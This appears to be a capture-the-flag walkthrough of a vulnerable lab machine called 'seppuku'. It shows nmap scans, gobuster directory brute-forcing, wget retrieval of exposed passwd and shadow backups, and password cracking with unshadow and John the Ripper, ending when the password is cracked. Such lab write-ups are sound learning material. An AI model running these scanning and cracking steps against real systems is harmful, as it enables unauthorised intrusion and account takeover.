The machine's IP has been aliased as `seppuku`.

## Recon
We start off by performing an initial scan for the top ports.

`nmap -F seppuku`

This revealed that the ports 21, 80, and 22 were open. So I tried to look into
those in detail.

`nmap -p 21,80,22 -sC -sV -oN nmap/initial seppuku`

```
# Nmap 7.92 scan initiated Wed Jun 15 06:51:50 2022 as: nmap -p 21,80,22 -sC -sV -oN nmap/initial 192.168.98.90
Nmap scan report for 192.168.98.90
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)
|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)
|_  256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)
80/tcp open  http    nginx 1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 15 06:52:05 2022 -- 1 IP address (1 host up) scanned in 15.33 seconds
```

This reveals that port 80 has a http-auth service that, well, requests for a
username and a password. After trying a few ways to bypass the authentication,
and failing every time, I decided to give up on 80 for a while. Same went for
the FTP service.

After being stuck at this for quite a while, I decided to check if there were
any more ports open (having realised I had used the `-F` option which scan only
a few ports). However, scanning so many ports would require a lot of time, so I
had to tweak the command line options in order to improve Nmap's performance.
After reading the page at https://nmap.org/book/performance.html a bit, I came
up with the following command:

`nmap -p- -Pn -T5 seppuku`

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
7080/tcp open  empowerid
7601/tcp open  unknown
8088/tcp open  radan-http
```


And, in fact, there were a few more ports that I hadn't known about. So I tried
looking at them in more detail.

`nmap -Pn -T5 -p 8088,7601,7080 -sC -sV seppuku`

```
PORT     STATE SERVICE  VERSION
7080/tcp open  ssl/http LiteSpeed httpd
|_http-title:  404 Not Found
| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
| Not valid before: 2020-05-13T06:51:35
|_Not valid after:  2022-08-11T06:51:35
| tls-alpn:
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: LiteSpeed
7601/tcp open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Seppuku
|_http-server-header: Apache/2.4.38 (Debian)
8088/tcp open  http     LiteSpeed httpd
|_http-title: Seppuku
|_http-server-header: LiteSpeed
```

So there's another web server at those ports! Trying the first port returned a
404 error. However, the port 7601 was interesting. Loading it up in the browser
showed me a picture depicting the _Seppuku_ ritual. I had _searx_'d
([[https://searx.github.io/searx/|Searx]] is a metasearch engine; great
alternative to _EvilGoogle_) what it meant earlier. The same was the response
for the final port.

Now time for some enum.

# Enumeration
I tried to bruteforce the directories first, and found myself to be lucky.

`gobuster dir -w /usr/share/dirb/wordlists/small.txt -u http://seppuku:7601`

```
===============================================================
/a                    (Status: 301) [Size: 305] [--> http://seppuku:7601/a/]
/b                    (Status: 301) [Size: 305] [--> http://seppuku:7601/b/]
/c                    (Status: 301) [Size: 305] [--> http://seppuku:7601/c/]
/database             (Status: 301) [Size: 312] [--> http://seppuku:7601/database/]
/d                    (Status: 301) [Size: 305] [--> http://seppuku:7601/d/]
/e                    (Status: 301) [Size: 305] [--> http://seppuku:7601/e/]
/production           (Status: 301) [Size: 314] [--> http://seppuku:7601/production/]
/secret               (Status: 301) [Size: 310] [--> http://seppuku:7601/secret/]
/w                    (Status: 301) [Size: 305] [--> http://seppuku:7601/w/]
===============================================================
```

As someone who's trying to break into a system, my eyes immediately landed
on the _s3cr3t5_! And indeed, secrets there were.

I just decided to download everything that `/secret` contained with `wget`.

`wget -r "http://seppuku:7601/secret"`

```
❯ ls -F1 -R seppuku:7601/
 secret/

seppuku:7601/secret:
 jack.jpg
 passwd.bak
 password.lst
 shadow.bak
```

Now time for cracking the passwords. I searx'd around for a while looking for
how I'd go about doing that, and I came across
[[https://erev0s.com/blog/cracking-etcshadow-john/|this]] article. I first
copied the final entry, with the user `rabbit-hole` and saved them in
`{passwd,shadow}.txt` files. I had to fix up the username in the shadow entry.
Then I basically just followed the instructions.

`unshadow secrets/passwd.txt secrets/shadow.txt > secrets/unshadow.txt`

Now for bruteforcing the passwords. To make this easy, the `/secret` directory
contained a `password.lst` file which we're supposed to use as the wordlist.

`john --wordlist=./secrets/password.lst secrets/unshadow.txt`

And `john` successfully cracked the password.
